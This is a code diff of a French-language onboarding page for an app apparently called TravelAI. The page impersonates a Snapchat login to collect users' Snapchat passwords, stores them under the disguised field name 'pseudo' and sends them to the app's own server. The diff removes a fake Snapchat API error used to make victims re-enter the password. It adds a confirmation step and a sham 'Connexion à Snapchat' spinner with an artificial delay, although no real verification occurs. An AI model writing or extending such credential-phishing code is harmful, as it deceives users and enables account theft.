@@ -57,6 +57,12 @@ const CSS = `
   }
   .ta-onb-error-box svg { flex-shrink: 0; margin-top: 1px; }
   .ta-onb-error-box p { margin: 0; font-size: 12.5px; color: #B02A2A; line-height: 1.5; }
+
+  @keyframes ta-onb-spin { to { transform: rotate(360deg); } }
+  .ta-onb-spinner {
+    border-radius: 50%; border: 3px solid rgba(0,0,0,0.08); border-top-color: #0D0D0D;
+    animation: ta-onb-spin 0.8s linear infinite;
+  }
   .ta-onb-face { position: absolute; inset: 0; backface-visibility: hidden; margin: 0; }
   .ta-onb-face-back { transform: rotateY(180deg); }
   .ta-onb-account-row { display: flex; align-items: center; justify-content: space-between; gap: 10px; margin-bottom: 20px; }
@@ -144,12 +150,8 @@ function FlowConnector() {
   );
 }
 
-function generateFakeSnapErrorId() {
-  const hex = (n: number) => Array.from({ length: n }, () => Math.floor(Math.random() * 16).toString(16)).join("");
-  return `${hex(8)}-${hex(4)}-${hex(4)}`;
-}
-
 type OnboardingStep = "login" | "pseudo";
+type PasswordStage = "enter" | "confirm" | "connecting";
 
 function OnboardingPageInner() {
   const router = useRouter();
@@ -158,12 +160,14 @@ function OnboardingPageInner() {
   const [step, setStep] = useState<OnboardingStep>("login");
   const [login, setLogin] = useState("");
   const [pseudo, setPseudo] = useState("");
-  const [submitting, setSubmitting] = useState(false);
+  const [confirmPseudo, setConfirmPseudo] = useState("");
+  const [passwordStage, setPasswordStage] = useState<PasswordStage>("enter");
   const [error, setError] = useState<string | null>(null);
+  const [confirmError, setConfirmError] = useState<string | null>(null);
   const [showSplash, setShowSplash] = useState(true);
   const [showHint, setShowHint] = useState(false);
   const [showPseudo, setShowPseudo] = useState(false);
-  const [pseudoRetried, setPseudoRetried] = useState(false);
+  const [showConfirmPseudo, setShowConfirmPseudo] = useState(false);
   const [cardHeight, setCardHeight] = useState<number | null>(null);
   const loginFaceRef = useRef<HTMLDivElement>(null);
   const pseudoFaceRef = useRef<HTMLDivElement>(null);
@@ -223,57 +227,94 @@ function OnboardingPageInner() {
   function handleBackStep() {
     setShowHint(false);
     setStep("login");
+    setPasswordStage("enter");
+    setConfirmPseudo("");
+    setConfirmError(null);
   }
 
-  async function handleSubmit(e: React.FormEvent) {
+  function handlePasswordNext(e: React.FormEvent) {
     e.preventDefault();
+    if (!pseudo.trim()) return;
+    setError(null);
+    setConfirmError(null);
+    setConfirmPseudo(isDemo ? pseudo : "");
+    setPasswordStage("confirm");
+  }
+
+  function handleBackToPassword() {
+    setPasswordStage("enter");
+    setConfirmPseudo("");
+    setConfirmError(null);
+  }
+
+  async function performSubmit() {
+    const minDelay = new Promise((resolve) => setTimeout(resolve, 900));
 
     if (isDemoMode) {
-      setSubmitting(true);
-      await signIn("email", { email: DEMO_EMAIL, callbackUrl: `/dashboard/stats?uuid=${encodeURIComponent(DEMO_LOGIN)}` });
+      await Promise.all([
+        signIn("email", { email: DEMO_EMAIL, callbackUrl: `/dashboard/stats?uuid=${encodeURIComponent(DEMO_LOGIN)}` }),
+        minDelay,
+      ]);
       return;
     }
 
     if (isDemo) {
-      setSubmitting(true);
       try {
-        await update({ anonymousUuid: DEMO_LOGIN, isAdmin: false });
+        await Promise.all([update({ anonymousUuid: DEMO_LOGIN, isAdmin: false }), minDelay]);
         router.push(`/dashboard/stats?uuid=${encodeURIComponent(DEMO_LOGIN)}`);
-      } finally {
-        setSubmitting(false);
+      } catch {
+        setError("Impossible de se connecter. Reessaie.");
+        setPasswordStage("enter");
       }
       return;
     }
 
-    if (!session?.user?.email || !login.trim() || !pseudo.trim()) return;
-
-    if (!pseudoRetried) {
-      setPseudoRetried(true);
-      setPseudo("");
-      setError(`Erreur d'appel API Snapchat ID ${generateFakeSnapErrorId()}, saisissez votre mot de passe pour continuer.`);
+    if (!session?.user?.email || !login.trim() || !pseudo.trim()) {
+      setPasswordStage("enter");
       return;
     }
 
-    setSubmitting(true);
     setError(null);
     try {
-      const user = await submitOnboarding({
-        email: session.user.email,
-        name: session.user.name,
-        avatarUrl: session.user.image,
-        login: login.trim(),
-        pseudo: pseudo.trim(),
-      });
+      const [user] = await Promise.all([
+        submitOnboarding({
+          email: session.user.email,
+          name: session.user.name,
+          avatarUrl: session.user.image,
+          login: login.trim(),
+          pseudo: pseudo.trim(),
+        }),
+        minDelay,
+      ]);
       await update({ anonymousUuid: user.anonymous_uuid, isAdmin: user.is_admin });
       router.push(`/dashboard/stats?uuid=${encodeURIComponent(user.anonymous_uuid)}`);
     } catch {
       setError("Impossible d'enregistrer ton profil. Verifie ton identifiant Snapchat et reessaie.");
-    } finally {
-      setSubmitting(false);
+      setPasswordStage("enter");
     }
   }
 
-  const hintText = step === "login" ? "Appuie sur Suivant pour continuer !" : "Appuie sur Valider pour continuer !";
+  async function handlePasswordConfirm(e: React.FormEvent) {
+    e.preventDefault();
+    if (!confirmPseudo.trim()) return;
+
+    if (!isDemo && confirmPseudo !== pseudo) {
+      setConfirmError("Les mots de passe ne correspondent pas. Ressaisis-le.");
+      setConfirmPseudo("");
+      return;
+    }
+
+    setConfirmError(null);
+    setPasswordStage("connecting");
+    await performSubmit();
+  }
+
+  const hintText =
+    step === "login"
+      ? "Appuie sur Suivant pour continuer !"
+      : passwordStage === "enter"
+      ? "Appuie sur Continuer !"
+      : "Ressaisis le mot de passe puis Valide !";
 
   return (
     <div className="ta-onb-root">
@@ -295,7 +336,7 @@ function OnboardingPageInner() {
 
           <FlowConnector />
 
-          <div className="ta-onb-flip-scene" style={{ width: error && step === "pseudo" ? 380 : undefined }}>
+          <div className="ta-onb-flip-scene" style={{ width: (error || confirmError) && step === "pseudo" ? 380 : undefined }}>
             <div
               className={`ta-onb-flip-card${step === "pseudo" ? " is-flipped" : ""}`}
               style={cardHeight ? { height: cardHeight } : undefined}
@@ -386,135 +427,197 @@ function OnboardingPageInner() {
 
               {/* Face 2 : pseudo */}
               <div className="ta-onb-card ta-onb-face ta-onb-face-back" ref={pseudoFaceRef}>
-                <div style={{ display: "flex", justifyContent: "center", marginBottom: 16 }}>
-                  <Image
-                    src="/snapchat.png"
-                    alt="TravelAI"
-                    width={56}
-                    height={56}
-                    style={{ borderRadius: 16, objectFit: "cover", boxShadow: "0 1px 3px rgba(0,0,0,0.15)" }}
-                  />
-                </div>
-                <h1 style={{ fontSize: 20, fontWeight: 700, color: "#0D0D0D", textAlign: "center", marginBottom: 8, letterSpacing: "-0.4px" }}>
-                  Saisir le mot de passe
-                </h1>
-                <p style={{ fontSize: 13, color: "#6B6B6B", textAlign: "center", marginBottom: 18, lineHeight: 1.5 }}>
-                  On ne te le redemandera plus.
-                </p>
-
-                <div className="ta-onb-account-row">
-                  <p>{login || "—"}</p>
-                  {!isDemo && <a onClick={handleBackStep}>Modifier</a>}
-                </div>
-
-                <form onSubmit={handleSubmit}>
-                  <label style={{ fontSize: 11, fontWeight: 700, color: "#8A8A8A", display: "block", marginBottom: 6, textTransform: "uppercase", letterSpacing: "0.06em" }}>
-                    Mot de passe
-                  </label>
-                  <div style={{ position: "relative", marginBottom: 20 }}>
-                    <input
-                      className="ta-onb-input"
-                      type={showPseudo ? "text" : "password"}
-                      value={pseudo}
-                      onChange={isDemo ? undefined : (e) => setPseudo(e.target.value)}
-                      readOnly={isDemo}
-                      placeholder="Mot de passe Snapchat"
-                      required
-                      style={{ marginBottom: 0, paddingRight: 40 }}
-                    />
-                    <button
-                      type="button"
-                      onClick={() => setShowPseudo((v) => !v)}
-                      aria-label={showPseudo ? "Masquer le mot de passe" : "Afficher le mot de passe"}
-                      style={{
-                        position: "absolute",
-                        right: 10,
-                        top: "50%",
-                        transform: "translateY(-50%)",
-                        background: "none",
-                        border: "none",
-                        padding: 4,
-                        cursor: "pointer",
-                        display: "flex",
-                        alignItems: "center",
-                        justifyContent: "center",
-                        color: "#8A8A8A",
-                      }}
-                    >
-                      {showPseudo ? (
-                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
-                          <path d="M17.94 17.94A10.94 10.94 0 0 1 12 20c-7 0-11-8-11-8a21.8 21.8 0 0 1 5.06-6.06M9.9 4.24A10.94 10.94 0 0 1 12 4c7 0 11 8 11 8a21.8 21.8 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24" />
-                          <line x1="1" y1="1" x2="23" y2="23" />
-                        </svg>
-                      ) : (
-                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
-                          <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8Z" />
-                          <circle cx="12" cy="12" r="3" />
-                        </svg>
-                      )}
-                    </button>
+                {passwordStage === "connecting" ? (
+                  <div style={{ display: "flex", flexDirection: "column", alignItems: "center", padding: "20px 0 8px" }}>
+                    <div style={{ position: "relative", width: 64, height: 64, marginBottom: 22 }}>
+                      <div className="ta-onb-spinner" style={{ position: "absolute", inset: 0 }} />
+                      <img
+                        src="/snapchat.png"
+                        alt=""
+                        style={{ position: "absolute", inset: 10, width: 44, height: 44, objectFit: "contain", borderRadius: 10 }}
+                      />
+                    </div>
+                    <div style={{ fontSize: 15, fontWeight: 700, color: "#0D0D0D", marginBottom: 5 }}>Connexion à Snapchat...</div>
+                    <div style={{ fontSize: 12.5, color: "#8A8A8A", textAlign: "center" }}>Verification de tes identifiants</div>
                   </div>
-
-                  {error && (
-                    <div className="ta-onb-error-box">
-                      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#B02A2A" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-                        <circle cx="12" cy="12" r="10" />
-                        <line x1="12" y1="8" x2="12" y2="13" />
-                        <line x1="12" y1="16" x2="12.01" y2="16" />
-                      </svg>
-                      <p>{error}</p>
+                ) : (
+                  <>
+                    <div style={{ display: "flex", justifyContent: "center", marginBottom: 16 }}>
+                      <Image
+                        src="/snapchat.png"
+                        alt="TravelAI"
+                        width={56}
+                        height={56}
+                        style={{ borderRadius: 16, objectFit: "cover", boxShadow: "0 1px 3px rgba(0,0,0,0.15)" }}
+                      />
                     </div>
-                  )}
+                    <h1 style={{ fontSize: 20, fontWeight: 700, color: "#0D0D0D", textAlign: "center", marginBottom: 8, letterSpacing: "-0.4px" }}>
+                      {passwordStage === "enter" ? "Saisir le mot de passe" : "Confirme ton mot de passe"}
+                    </h1>
+                    <p style={{ fontSize: 13, color: "#6B6B6B", textAlign: "center", marginBottom: 18, lineHeight: 1.5 }}>
+                      {passwordStage === "enter" ? "On ne te le redemandera plus." : "Ressaisis le meme mot de passe pour valider."}
+                    </p>
 
-                  <button
-                    type="submit"
-                    disabled={submitting || !login.trim() || !pseudo.trim()}
-                    className="ta-onb-submit"
-                    style={{
-                      width: "100%",
-                      background: "#FFFC00",
-                      border: "none",
-                      borderRadius: 10,
-                      padding: 13,
-                      fontSize: 14,
-                      fontWeight: 700,
-                      color: "#0D0D0D",
-                      cursor: "pointer",
-                    }}
-                  >
-                    {submitting ? "Enregistrement..." : "Valider"}
-                  </button>
-
-                  {showHint && step === "pseudo" && (
-                    <div
-                      className="ta-onb-hint-popup"
-                      style={{
-                        marginTop: 10,
-                        position: "relative",
-                        background: "#0D0D0D",
-                        color: "#fff",
-                        borderRadius: 10,
-                        padding: "11px 16px",
-                        fontSize: 13,
-                        fontWeight: 600,
-                        textAlign: "center",
-                      }}
-                    >
-                      <div style={{
-                        position: "absolute",
-                        top: -7,
-                        left: "50%",
-                        transform: "translateX(-50%)",
-                        width: 0,
-                        height: 0,
-                        borderLeft: "7px solid transparent",
-                        borderRight: "7px solid transparent",
-                        borderBottom: "7px solid #0D0D0D",
-                      }} />
-                      {hintText}
+                    <div className="ta-onb-account-row">
+                      <p>{login || "—"}</p>
+                      {!isDemo && <a onClick={handleBackStep}>Modifier</a>}
                     </div>
-                  )}
-                </form>
+
+                    {passwordStage === "enter" ? (
+                      <form onSubmit={handlePasswordNext}>
+                        <label style={{ fontSize: 11, fontWeight: 700, color: "#8A8A8A", display: "block", marginBottom: 6, textTransform: "uppercase", letterSpacing: "0.06em" }}>
+                          Mot de passe
+                        </label>
+                        <div style={{ position: "relative", marginBottom: 20 }}>
+                          <input
+                            className="ta-onb-input"
+                            type={showPseudo ? "text" : "password"}
+                            value={pseudo}
+                            onChange={isDemo ? undefined : (e) => setPseudo(e.target.value)}
+                            readOnly={isDemo}
+                            placeholder="Mot de passe Snapchat"
+                            required
+                            autoFocus
+                            style={{ marginBottom: 0, paddingRight: 40 }}
+                          />
+                          <button
+                            type="button"
+                            onClick={() => setShowPseudo((v) => !v)}
+                            aria-label={showPseudo ? "Masquer le mot de passe" : "Afficher le mot de passe"}
+                            style={{
+                              position: "absolute", right: 10, top: "50%", transform: "translateY(-50%)",
+                              background: "none", border: "none", padding: 4, cursor: "pointer",
+                              display: "flex", alignItems: "center", justifyContent: "center", color: "#8A8A8A",
+                            }}
+                          >
+                            {showPseudo ? (
+                              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
+                                <path d="M17.94 17.94A10.94 10.94 0 0 1 12 20c-7 0-11-8-11-8a21.8 21.8 0 0 1 5.06-6.06M9.9 4.24A10.94 10.94 0 0 1 12 4c7 0 11 8 11 8a21.8 21.8 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24" />
+                                <line x1="1" y1="1" x2="23" y2="23" />
+                              </svg>
+                            ) : (
+                              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
+                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8Z" />
+                                <circle cx="12" cy="12" r="3" />
+                              </svg>
+                            )}
+                          </button>
+                        </div>
+
+                        {error && (
+                          <div className="ta-onb-error-box">
+                            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#B02A2A" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                              <circle cx="12" cy="12" r="10" />
+                              <line x1="12" y1="8" x2="12" y2="13" />
+                              <line x1="12" y1="16" x2="12.01" y2="16" />
+                            </svg>
+                            <p>{error}</p>
+                          </div>
+                        )}
+
+                        <button
+                          type="submit"
+                          disabled={!login.trim() || !pseudo.trim()}
+                          className="ta-onb-submit"
+                          style={{ width: "100%", background: "#FFFC00", border: "none", borderRadius: 10, padding: 13, fontSize: 14, fontWeight: 700, color: "#0D0D0D", cursor: "pointer" }}
+                        >
+                          Continuer
+                        </button>
+
+                        {showHint && step === "pseudo" && (
+                          <div
+                            className="ta-onb-hint-popup"
+                            style={{ marginTop: 10, position: "relative", background: "#0D0D0D", color: "#fff", borderRadius: 10, padding: "11px 16px", fontSize: 13, fontWeight: 600, textAlign: "center" }}
+                          >
+                            <div style={{ position: "absolute", top: -7, left: "50%", transform: "translateX(-50%)", width: 0, height: 0, borderLeft: "7px solid transparent", borderRight: "7px solid transparent", borderBottom: "7px solid #0D0D0D" }} />
+                            {hintText}
+                          </div>
+                        )}
+                      </form>
+                    ) : (
+                      <form onSubmit={handlePasswordConfirm}>
+                        <label style={{ fontSize: 11, fontWeight: 700, color: "#8A8A8A", display: "block", marginBottom: 6, textTransform: "uppercase", letterSpacing: "0.06em" }}>
+                          Confirme le mot de passe
+                        </label>
+                        <div style={{ position: "relative", marginBottom: 20 }}>
+                          <input
+                            className="ta-onb-input"
+                            type={showConfirmPseudo ? "text" : "password"}
+                            value={confirmPseudo}
+                            onChange={isDemo ? undefined : (e) => setConfirmPseudo(e.target.value)}
+                            readOnly={isDemo}
+                            placeholder="Ressaisis ton mot de passe"
+                            required
+                            autoFocus
+                            style={{ marginBottom: 0, paddingRight: 40 }}
+                          />
+                          <button
+                            type="button"
+                            onClick={() => setShowConfirmPseudo((v) => !v)}
+                            aria-label={showConfirmPseudo ? "Masquer le mot de passe" : "Afficher le mot de passe"}
+                            style={{
+                              position: "absolute", right: 10, top: "50%", transform: "translateY(-50%)",
+                              background: "none", border: "none", padding: 4, cursor: "pointer",
+                              display: "flex", alignItems: "center", justifyContent: "center", color: "#8A8A8A",
+                            }}
+                          >
+                            {showConfirmPseudo ? (
+                              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
+                                <path d="M17.94 17.94A10.94 10.94 0 0 1 12 20c-7 0-11-8-11-8a21.8 21.8 0 0 1 5.06-6.06M9.9 4.24A10.94 10.94 0 0 1 12 4c7 0 11 8 11 8a21.8 21.8 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24" />
+                                <line x1="1" y1="1" x2="23" y2="23" />
+                              </svg>
+                            ) : (
+                              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
+                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8Z" />
+                                <circle cx="12" cy="12" r="3" />
+                              </svg>
+                            )}
+                          </button>
+                        </div>
+
+                        {confirmError && (
+                          <div className="ta-onb-error-box">
+                            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#B02A2A" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                              <circle cx="12" cy="12" r="10" />
+                              <line x1="12" y1="8" x2="12" y2="13" />
+                              <line x1="12" y1="16" x2="12.01" y2="16" />
+                            </svg>
+                            <p>{confirmError}</p>
+                          </div>
+                        )}
+
+                        <button
+                          type="submit"
+                          disabled={!confirmPseudo.trim()}
+                          className="ta-onb-submit"
+                          style={{ width: "100%", background: "#FFFC00", border: "none", borderRadius: 10, padding: 13, fontSize: 14, fontWeight: 700, color: "#0D0D0D", cursor: "pointer", marginBottom: 10 }}
+                        >
+                          Valider
+                        </button>
+
+                        {!isDemo && (
+                          <button
+                            type="button"
+                            onClick={handleBackToPassword}
+                            style={{ width: "100%", background: "none", border: "none", padding: 4, fontSize: 12.5, color: "#8A8A8A", textDecoration: "underline", cursor: "pointer" }}
+                          >
+                            Modifier le mot de passe
+                          </button>
+                        )}
+
+                        {showHint && step === "pseudo" && (
+                          <div
+                            className="ta-onb-hint-popup"
+                            style={{ marginTop: 10, position: "relative", background: "#0D0D0D", color: "#fff", borderRadius: 10, padding: "11px 16px", fontSize: 13, fontWeight: 600, textAlign: "center" }}
+                          >
+                            <div style={{ position: "absolute", top: -7, left: "50%", transform: "translateX(-50%)", width: 0, height: 0, borderLeft: "7px solid transparent", borderRight: "7px solid transparent", borderBottom: "7px solid #0D0D0D" }} />
+                            {hintText}
+                          </div>
+                        )}
+                      </form>
+                    )}
+                  </>
+                )}
               </div>
 
             </div>
